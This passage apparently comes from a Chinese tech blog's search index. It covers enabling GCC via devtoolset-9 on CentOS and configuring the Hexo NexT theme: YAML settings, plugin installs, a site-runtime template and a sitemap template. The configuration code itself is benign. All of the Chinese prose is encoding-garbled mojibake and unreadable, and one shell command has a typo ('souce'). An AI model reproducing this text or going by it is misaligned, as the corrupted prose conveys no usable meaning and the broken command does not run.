ç‰ˆæœ¬ï¼Œå³å¼€å³ç”¨ï¼Œä»…åœ¨å½“å‰ bash ä¸­æœ‰æ•ˆ 1# scl enable devtoolset-9 bash æ°¸ä¹…å¯ç”¨ï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ°¸ä¹…å¯ç”¨ GCCï¼Œè¿™ç§æ–¹å¼é€‚ç”¨äºé•¿æœŸä½¿ç”¨è¯¥ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘ï¼Œåˆ‡æ¢ bash ä¾ç„¶æœ‰æ•ˆ 1# echo "source /opt/rh/devtoolset-9/enable" &gt;&gt; /etc/profile &amp;&amp; souce /etc/profile æŸ¥çœ‹ GCC ç‰ˆæœ¬ 1# gcc --version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo Next ä¸»é¢˜è¯¦ç»†é…ç½®ä¹‹ä¸€",url:"/posts/755ff30d.html",text:'å‰è¨€ Next å®˜æ–¹æ•™ç¨‹ - å¼€å§‹ä½¿ç”¨ Next å®˜æ–¹æ•™ç¨‹ - ä¸»é¢˜é…ç½® Next å®˜æ–¹æ•™ç¨‹ - å¸¸è§é—®é¢˜ Next å®‰è£…ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡ä½¿ç”¨å„è½¯ä»¶çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š è½¯ä»¶ ç‰ˆæœ¬ hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next å„ç‰ˆæœ¬çš„ä»‹ç»å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒNext ä¸åŒç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯ä¸åŒçš„ä»“åº“ï¼Œå„ç‰ˆæœ¬çš„ä»“åº“å¦‚ä¸‹ï¼š å¹´ä»½ ç‰ˆæœ¬ ä»“åº“ 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next ä¸»é¢˜ä¸ Hexo çš„ç‰ˆæœ¬å…¼å®¹å¦‚ä¸‹ï¼š Next ä¸»é¢˜å®‰è£… 7.x ç‰ˆæœ¬å…‹éš†æ•´ä¸ª Next ä»“åº“ï¼Œè¿™é‡Œä½¿ç”¨ Next 7.x ç‰ˆæœ¬ 12# å…‹éš†ä»£ç ï¼ˆNextä¸åŒç‰ˆæœ¬ä½¿ç”¨ä¸åŒä»“åº“ï¼‰$ git clone https://github.com/theme-next/hexo-theme-next themes/next æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1theme: next æ—¥åå¯ä»¥éšæ—¶ä½¿ç”¨ Git æ›´æ–°å½“å‰ Next çš„ç‰ˆæœ¬ï¼Œå¹¶åˆ‡æ¢åˆ°ä»»ä½•å¸¦æ ‡ç­¾çš„ç‰ˆæœ¬ï¼Œæˆ–è€…åˆ‡æ¢åˆ°æœ€æ–°çš„ master æˆ–ä»»ä½•å…¶ä»–åˆ†æ”¯ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™å¯¹ç”¨æˆ·å’Œå¼€å‘äººå‘˜éƒ½æœ‰ç”¨ã€‚ 123456789101112131415161718# è¿›å…¥ä¸»é¢˜ç›®å½•$ cd themes/next# æŸ¥çœ‹å¸¦æ ‡ç­¾çš„ç‰ˆæœ¬$ git tag -lv6.0.0v6.0.1v6.0.2â€¦# åˆ‡æ¢åˆ°ç‰¹å®šæ ‡ç­¾çš„ç‰ˆæœ¬$ git checkout tags/v6.0.1# é‡æ–°åˆ‡æ¢ä¸ºmasteråˆ†æ”¯$ git checkout master# æ›´æ–°ä»£ç $ git pull Next å¸¸è§„é…ç½®PDF æ˜¾ç¤ºNext é»˜è®¤æ”¯æŒ PDF è‡ªå®šä¹‰æ ‡ç­¾ï¼Œä½¿ç”¨æ ¼å¼ä¸ºï¼š {% pdf https://www.example.com/spring.pdf %}ã€‚è‹¥å¸Œæœ›å¯ç”¨ PDF çš„æ”¯æŒï¼Œéœ€è¦æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ 1234pdf: enable: true # Default height height: 550px é¦–é¡µåƒæ˜¾ç¤ºå¤´æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1234avatar: url: /images/avatar.png # å¤´åƒå›¾ç‰‡ rounded: true # å¤´åƒæ˜¾ç¤ºåœ¨åœ†é‡Œ rotated: true # é¼ æ ‡ç„¦ç‚¹è½åœ¨å¤´åƒæ—¶ï¼Œæ˜¯å¦è½¬åŠ¨å¤´åƒ èœå•æ˜¾ç¤ºä¸­æ–‡åœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åè®¾ç½®ä»¥ä¸‹çš„é…ç½®é¡¹ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œçš„å­—ä½“æ˜¯ zh-CNï¼Œè€Œä¸æ˜¯ zh-Hans 1language: zh-CN å¯ç”¨æ–‡ç« ç›®å½•æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123456toc: enable: true number: false # è‡ªåŠ¨æ·»åŠ ç›®å½•ç¼–å· wrap: true # æ¯è¡Œç›®å½•å­—æ•°è¶…é•¿è‡ªåŠ¨æ¢è¡Œ expand_all: true # å±•å¼€æ‰€æœ‰çº§åˆ« max_depth: 5 # ç›®å½•çš„æœ€å¤§æ·±åº¦ å¯ç”¨æ–‡ç« æ‰“èµæ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ï¼Œéœ€è¦å°†æ”¶æ¬¾äºŒç»´ç å›¾ç‰‡æ”¾åˆ° themes/next/source/images æ–‡ä»¶å¤¹ä¸‹ï¼Œæˆ–è€…ä½¿ç”¨è‡ªå®šä¹‰çš„å›¾ç‰‡ç›®å½•è·¯å¾„ 12345678reward_settings: enable: true animation: false comment: åšæŒåŸåˆ›æŠ€æœ¯åˆ†äº«ï¼Œæ‚¨çš„æ”¯æŒå°†é¼“åŠ±æˆ‘ç»§ç»­åˆ›ä½œï¼reward: wechatpay: /images/wechatpay.png alipay: /images/alipay.png æ·»åŠ ç‰ˆæƒå£°æ˜æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12345creative_commons: license: by-nc-sa # Licenseç±»å‹ï¼š by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero sidebar: false # åœ¨ä¾§è¾¹æ æœ‰ä¸€ä¸ªç‰ˆæƒçš„å›¾ç‰‡é“¾æ¥ post: true # åœ¨æ¯ä¸€ç¯‡æ–‡ç« æœ«å°¾è‡ªåŠ¨å¢åŠ æœ¬æ–‡ä½œè€…ã€æœ¬æ–‡é“¾æ¥ã€ç‰ˆæƒå£°æ˜ä¿¡æ¯ language: deed.zh # ç‚¹å‡»é“¾æ¥åæ˜¾ç¤ºçš„ç‰ˆæƒä¿¡æ¯çš„è¯­è¨€ å¦‚æœéœ€è¦è‡ªå®šä¹‰æ–‡ç« åº•éƒ¨ç‰ˆæƒä¿¡æ¯çš„ï¼Œå¯ä»¥è‡ªè¡Œä¿®æ”¹ themes/next/layout/_partials/post/post-copyright.swig æ¨¡ç‰ˆæ–‡ä»¶æ¥å®ç° æ·»åŠ æ ‡ç­¾é¡µé¢é€šè¿‡ Hexo åˆ›å»ºä¸€ä¸ªæ ‡ç­¾é¡µé¢ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# åˆ›å»ºæ ‡ç­¾é¡µ$ hexo new page tags åˆ›å»ºå®Œæ ‡ç­¾é¡µåï¼Œå‘ç° source æ–‡ä»¶å¤¹ä¸‹ä¼šå¤šäº† tags/index.md æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨äºæ˜¾ç¤ºç«™ç‚¹å†…æ‰€æœ‰åˆ†ç±»æ ‡ç­¾çš„ï¼Œå¤åˆ¶ä»¥ä¸‹å†…å®¹åˆ° tags/index.md ä¸­ï¼Œå¿…é¡»ä½¿ç”¨ --- åŒ…è£¹é…ç½®å†…å®¹ï¼Œå¦åˆ™é…ç½®æ— æ•ˆ 123456---title: æ ‡ç­¾type: "tags"comments: falsedate: 2021-04-05 17:13:00--- è‹¥åšå®¢æœ‰é›†æˆè¯„è®ºæœåŠ¡ï¼Œæ ‡ç­¾é¡µé¢ä¹Ÿä¼šå¸¦æœ‰è¯„è®ºï¼Œéœ€è¦å…³é—­çš„è¯ï¼Œè¯·æ·»åŠ å­—æ®µ comments å¹¶å°†å€¼è®¾ç½®ä¸º false æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12menu: tags: /tags/ || fa fa-tags æ·»åŠ ç½‘ç«™å¤‡æ¡ˆå·æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123beian: enable: true icp: \'ç²¤ICPå¤‡19024664å·\' å¯ç”¨ä¸è’œå­ç»Ÿè®¡æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12345678busuanzi_count: enable: true total_visitors: true total_visitors_icon: fa fa-user total_views: true total_views_icon: fa fa-eye post_views: true post_views_icon: fa fa-eye é¦–é¡µä¸æ˜¾ç¤ºæ–‡ç« æè¿°æ‘˜å½•Next ä¸»é¢˜é»˜è®¤ä¼šåœ¨é¦–é¡µé‡Œå°†æ–‡ç« æè¿°æ‘˜å½•ä¸ºå‰è¨€æ–‡æœ¬ï¼Œä½†åœ¨é¦–é¡µæ˜¾ç¤ºä¸€ç¯‡æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ï¼Œå¹¶æä¾›ä¸€ä¸ªé“¾æ¥è·³è½¬åˆ°å…¨æ–‡é¡µé¢æ˜¯ä¸€ä¸ªå¸¸è§çš„éœ€æ±‚ã€‚ NexT æä¾›ä¸‰ç§æ–¹å¼æ¥æ§åˆ¶æ–‡ç« åœ¨é¦–é¡µçš„æ˜¾ç¤ºæ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨é¦–é¡µæ˜¾ç¤ºæ–‡ç« çš„æ‘˜å½•å¹¶æ˜¾ç¤º é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œå¯ä»¥æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1excerpt_description: false å»ºè®®ä½¿ç”¨ &lt;!-- more --&gt;ï¼Œé™¤äº†å¯ä»¥ç²¾ç¡®æ§åˆ¶éœ€è¦æ˜¾ç¤ºçš„æ‘˜å½•å†…å®¹ä»¥å¤–ï¼Œè¿™ç§æ–¹å¼ä¹Ÿå¯ä»¥è®© Hexo ä¸­çš„æ’ä»¶æ›´å¥½çš„è¯†åˆ« Next è¿›é˜¶é…ç½®å¯ç”¨ PjaxPjax ä¸»è¦ç”¨äºåŠ é€Ÿ Web é¡µé¢çš„åˆ‡æ¢é€Ÿåº¦ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨æ¥è§£å†³ Aplayer éŸ³é¢‘æ’­å‘å™¨åˆ‡æ¢é¡µé¢åæ’­æ”¾å‡ºç°ä¸­æ–­çš„é—®é¢˜ 12345# è¿›å…¥Nextä¸»é¢˜çš„ç›®å½•$ cd themes/next# ä¸‹è½½èµ„æºæ–‡ä»¶$ git clone https://github.com/theme-next/theme-next-pjax source/lib/pjax æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1pjax: true å¯ç”¨èƒŒæ™¯ 3D åŠ¨ç”»Next ä¸»é¢˜é»˜è®¤æ”¯æŒ 3D èƒŒæ™¯åŠ¨ç”»ï¼Œå®˜æ–¹é…ç½®æ•™ç¨‹å¯ä»¥çœ‹è¿™é‡Œï¼Œå‰ææ˜¯éœ€è¦ä¸‹è½½æŒ‡å®šçš„é™æ€èµ„æºæ–‡ä»¶æˆ–è€…ä½¿ç”¨ CDN é™æ€èµ„æºæ–‡ä»¶ 12345# è¿›å…¥Nextä¸»é¢˜çš„ç›®å½•$ cd themes/next# ä¸‹è½½3Dèµ„æºæ–‡ä»¶$ git clone https://github.com/theme-next/theme-next-three source/lib/three æˆ–è€…æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œé€šè¿‡ä»¥ä¸‹é…ç½®å†…å®¹æ¥æŒ‡å®š CDN é™æ€èµ„æºæ–‡ä»¶çš„ URL 12345vendors: three: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js three_waves: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12345three: enable: true three_waves: true # èƒŒæ™¯3DåŠ¨ç”»æ ·å¼ä¸€ canvas_lines: false # èƒŒæ™¯3DåŠ¨ç”»æ ·å¼äºŒ canvas_sphere: false # èƒŒæ™¯3DåŠ¨ç”»æ ·å¼ä¸‰ å¯ç”¨å›¾ç‰‡ç‚¹å‡»å±…ä¸­é¢„è§ˆæ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1mediumzoom: true å¯ç”¨ Canvas Ribbon èƒŒæ™¯Next ä¸»é¢˜é»˜è®¤æ”¯æŒ Canvas Ribbon èƒŒæ™¯ï¼Œå®˜æ–¹é…ç½®æ•™ç¨‹å¯ä»¥çœ‹è¿™é‡Œï¼Œå‰ææ˜¯éœ€è¦ä¸‹è½½æŒ‡å®šçš„é™æ€èµ„æºæ–‡ä»¶æˆ–è€…ä½¿ç”¨ CDN é™æ€èµ„æºæ–‡ä»¶ 12345# è¿›å…¥Nextä¸»é¢˜çš„ç›®å½•$ cd themes/next# # ä¸‹è½½Canvasèµ„æºæ–‡ä»¶$ git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon æˆ–è€…æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œé€šè¿‡ä»¥ä¸‹é…ç½®å†…å®¹æ¥æŒ‡å®š CDN é™æ€èµ„æºæ–‡ä»¶çš„ URL 12vendors: canvas_ribbon: //cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12345canvas_ribbon: enable: true size: 300 # Ribbonçš„å®½åº¦ alpha: 0.6 # Ribbonçš„é€æ˜åº¦ zIndex: -1 # Ribbonçš„æ˜¾ç¤ºçº§åˆ« æ·»åŠ é¡µé¢é¡¶éƒ¨åŠ è½½è¿›åº¦æ¡12345# è¿›å…¥Nextä¸»é¢˜çš„ç›®å½•$ cd themes/next# å…‹éš†ä»£ç $ git clone https://github.com/theme-next/theme-next-pace source/lib/pace æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123pace: enable: true theme: minimal æ·»åŠ é¡µé¢é¡¶éƒ¨é˜…è¯»è¿›åº¦æ¡12345# è¿›å…¥Nextä¸»é¢˜çš„ç›®å½•$ cd themes/next# å…‹éš†ä»£ç $ git clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12345reading_progress: enable: true position: top # è¿›åº¦æ¡çš„ä½ç½®ï¼štop | bottom color: "#37c6c0" # è¿›åº¦æ¡çš„é¢œè‰² height: 3px # è¿›åº¦æ¡çš„å¤§å° æ˜¾ç¤ºä¾§æ é˜…è¯»è¿›åº¦ç™¾åˆ†æ¯”æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1234back2top: enable: true sidebar: false scrollpercent: true Next é¡µé¢æ ·å¼æ›´æ”¹è¶…é“¾æ¥æ ·å¼æ‰“å¼€ CSS æ–‡ä»¶ themes/next/source/css/_common/components/post/post.stylï¼Œåœ¨æœ«å°¾æ·»åŠ ä»¥ä¸‹ CSS æ ·å¼ï¼Œé¢œè‰²å¯è‡ªå®šä¹‰ï¼Œåœ¨è¿™é‡Œè¶…é“¾æ¥é€‰ä¸­çŠ¶æ€ä¸ºæ©™è‰²ï¼Œé“¾æ¥æ ·å¼ä¸ºè“è‰² 12345678910.post-body p a{ color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover { color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; }} ä»£ç å—é«˜äº®æ ·å¼æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123456codeblock: highlight_theme: \'night eighties\' # ä»£ç é«˜äº®å¯é€‰æ ·å¼: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic copy_button: enable: true # å¯ç”¨ä»£ç å¤åˆ¶æŒ‰é’® show_result: false # æ˜¾ç¤ºä»£ç å¤åˆ¶ç»“æœ style: flat # ä»£ç å—å¯é€‰æ ·å¼: default | flat | mac æ–‡ç« åº•éƒ¨æ ‡ç­¾æ ·å¼æ‰“å¼€æ¨¡æ¿æ–‡ä»¶ themes/next/layout/_macro/post.swigï¼Œå°†ä»¥ä¸‹å†…å®¹æ›¿æ¢æ‰ 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt;{{ tag_indicate }} {{ tag.name }}&lt;/a&gt;{%- endfor %} æ›¿æ¢çš„å†…å®¹å¦‚ä¸‹ 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt; &lt;i class="fa fa-tag"&gt;&lt;/i&gt; {{ tag.name }}&lt;/a&gt;{%- endfor %} é¡µé¢åº•éƒ¨æ·»åŠ ç«™ç‚¹è¿è¡Œæ—¶é—´åœ¨ themes/next/layout/_partials/ ç›®å½•ä¸‹åˆ›å»º runtime.swig æºæ–‡ä»¶ï¼Œå¹¶æ·»åŠ å¦‚ä¸‹å†…å®¹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;div id="site-runtime"&gt; &lt;span class="post-meta-item-icon"&gt; &lt;i class="fa fa-clock-o"&gt;&lt;/i&gt; &lt;/span&gt; &lt;span id="runtime"&gt;&lt;/span&gt;&lt;/div&gt;&lt;script language="javascript"&gt; function isPC() { var userAgentInfo = navigator.userAgent; var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"]; for (var i = 0; i &lt; agents.length; i++) { if (userAgentInfo.indexOf(agents[i]) &gt; 0) { return false; } } return true; } function siteTime(openOnPC, start) { window.setTimeout("siteTime(openOnPC, start)", 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; {%- if theme.runtime.start %} start = new Date("{{ theme.runtime.start }}"); {%- endif %} var now = new Date(); var year = now.getFullYear(); var month = now.getMonth() + 1; var date = now.getDate(); var hour = now.getHours(); var minute = now.getMinutes(); var second = now.getSeconds(); var diff = now - start; var diffYears = Math.floor(diff / years); var diffDays = Math.floor((diff / days) - diffYears * 365); var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); if (openOnPC) { document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs"; } else { document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s"; } } var showOnMobile = {{ theme.runtime.mobile }}; var openOnPC = isPC(); var start = new Date(); siteTime(openOnPC, start); if (!openOnPC &amp;&amp; !showOnMobile) { document.getElementById(\'site-runtime\').style.display = \'none\'; }&lt;/script&gt; ç¼–è¾‘æºæ–‡ä»¶ themes/next/layout/_partials/footer.swigï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ 123{%- if theme.runtime.enable %} {% include \'runtime.swig\' %}{%- endif %} æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ 12345678910# Site Runtimeruntime: enable: true # The time of the site started running. If not defined, current time of local time zone will be used. # You can specify the time zone by adding the `+HOURS` or `-HOURS` format time zone. # If not specify the time zone, it will use `+0000` as default. # ex: "2015-06-08 07:24:13 +0800", `+0800` specify that it is the time in the East Eight Time Zone. start: 2019-11-23 09:00:00 +0800 # Whether to show on the mobile side mobile: false Next å®‰è£…å¸¸ç”¨æ’ä»¶æ ‡ç­¾äº‘æ’ä»¶ Hexo-Tag-Cloud 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…æ ‡ç­¾äº‘æ’ä»¶$ npm install hexo-tag-cloud --save æ›´æ”¹ Next ä¸»é¢˜çš„æºæ–‡ä»¶ themes/next/layout/_macro/sidebar.swig, ç„¶ååœ¨æœ€åæ·»åŠ å¦‚ä¸‹å†…å®¹ 123456789101112{% if site.tags.length &gt; 1 %}&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcloud.js\') }}"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcanvas.js\') }}"&gt;&lt;/script&gt;&lt;div class="widget-wrap"&gt; &lt;h3 class="widget-title"&gt;Tag Cloud&lt;/h3&gt; &lt;div id="myCanvasContainer" class="widget tagcloud"&gt; &lt;canvas width="250" height="250" id="resCanvas" style="width:100%"&gt; {{ list_tags() }} &lt;/canvas&gt; &lt;/div&gt;&lt;/div&gt;{% endif %} hexo-tag-cloud æ’ä»¶æ”¯æŒè‡ªå®šä¹‰æ ‡ç­¾äº‘çš„å­—ä½“ã€é¢œè‰²å’Œé«˜äº®æ˜¾ç¤ºï¼Œåœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹çš„é…ç½®é¡¹ 1234567tag_cloud: textFont: Trebuchet MS, Helvetica # å­—ä½“ textColor: \'#333\' # å­—ä½“é¢œè‰² textHeight: 25 # å­—ä½“å¤§å° outlineColor: \'#E2E1D1\' maxSpeed: 0.5 # æ—‹è½¬é€Ÿåº¦ pauseOnSelected: false # å½“é€‰ä¸­å¯¹åº”æ ‡ç­¾æ—¶ï¼Œæ˜¯å¦åœæ­¢è½¬åŠ¨ å®Œæˆå®‰è£…å’Œé…ç½®åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡Œæœ¬åœ°é¢„è§ˆï¼Œå…¶ä¸­ hexo clean ä¸ºå¿…é¡»é€‰é¡¹ 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s æœ¬åœ°æœç´¢æ’ä»¶Next ä¸»é¢˜é»˜è®¤æ”¯æŒä½¿ç”¨ Hexo-Generator-Searchdb æ’ä»¶æ¥å®ç°æœ¬åœ°æœç´¢ï¼Œå‰ææ˜¯éœ€è¦æ‰‹åŠ¨å®‰è£…å¯¹åº”çš„æ’ä»¶ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…æœç´¢æ’ä»¶$ npm install hexo-generator-searchdb --save åœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹çš„é…ç½®é¡¹ 123456search: path: search.xml field: post content: true format: html limit: 1000 æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123456local_search: enable: true trigger: auto top_n_per_article: 1 unescape: false preload: false RSS è®¢é˜…æ’ä»¶hexo-generator-feed æ’ä»¶ç”¨äºåœ¨ public ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆ atom.xml æ–‡ä»¶ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…RSSè®¢é˜…æ’ä»¶$ npm install hexo-generator-feed --save åœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹çš„é…ç½®é¡¹ 1234567feed: limit: 20 type: atom path: atom.xml order_by: -date content_limit: 140 autodiscovery: true æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 12social: RSS: /atom.xml || fa fa-rss ç«™ç‚¹åœ°å›¾æ’ä»¶hexo-generator-sitemap ç«™ç‚¹åœ°å›¾æ’ä»¶ä¼šåœ¨ public ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆ sitemap.xml æ–‡ä»¶ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…æ’ä»¶$ npm install hexo-generator-sitemap --save åœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œåˆ›å»ºç«™ç‚¹åœ°å›¾çš„æ¨¡æ¿æ–‡ä»¶ sitemap_template.xmlï¼Œå°†ä»¥ä¸‹å†…å®¹å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; {% for post in posts %} &lt;url&gt; &lt;loc&gt;{{ post.permalink | uriencode }}&lt;/loc&gt; {% if post.updated %} &lt;lastmod&gt;{{ post.updated.toISOString() }}&lt;/lastmod&gt; {% elif post.date %} &lt;lastmod&gt;{{ post.date.toISOString() }}&lt;/lastmod&gt; {% endif %} &lt;/url&gt; {% endfor %}&lt;/urlset&gt; åœ¨åšå®¢çš„æ ¹ç›®å½•é‡Œï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹çš„é…ç½®é¡¹ 123sitemap: path: sitemap.xml template: ./sitemap_template.xml å­—æ•°ä¸é˜…è¯»æ—¶é•¿ç»Ÿè®¡æ’ä»¶Next ä¸»é¢˜é»˜è®¤æ”¯æŒä½¿ç”¨ hexo-symbols-count-time æ’ä»¶æ¥ç»Ÿè®¡æ–‡ç« å­—æ•°å’Œé˜…è¯»æ—¶é•¿ï¼Œå‰ææ˜¯éœ€è¦æ‰‹åŠ¨å®‰è£…å¯¹åº”çš„æ’ä»¶ 12345678# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…ä¾èµ–$ npm install eslint --save# å®‰è£…æ’ä»¶$ npm install hexo-symbols-count-time --save åœ¨åšå®¢çš„æ 